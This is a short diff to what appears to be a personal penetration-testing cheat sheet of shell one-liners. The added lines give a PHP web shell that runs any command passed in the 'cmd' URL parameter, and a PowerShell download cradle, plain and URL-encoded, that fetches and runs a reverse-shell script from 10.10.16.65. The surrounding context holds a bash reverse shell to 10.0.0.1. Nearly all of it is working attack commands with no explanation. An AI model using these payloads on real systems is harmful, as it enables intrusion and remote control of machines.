@@ -9,6 +9,14 @@ $output = shell_exec('ls -lart');
 echo "<pre>$output</pre>";
 ?>
 
+#PHP Simple Web Shell with 'cmd' as an argument to be passed in URL
+<?php shell_exec($_GET['cmd']); ?>
+
+#Powerhshell get file from server:
+powershell.exe IEX(New-Object+Net.WebClient).downloadString('http://10.10.16.65/Invoke-PowerShellTcp.ps1')
+#URL Encoded:
+powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.65/Invoke-PowerShellTcp.ps1')
+
 #bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
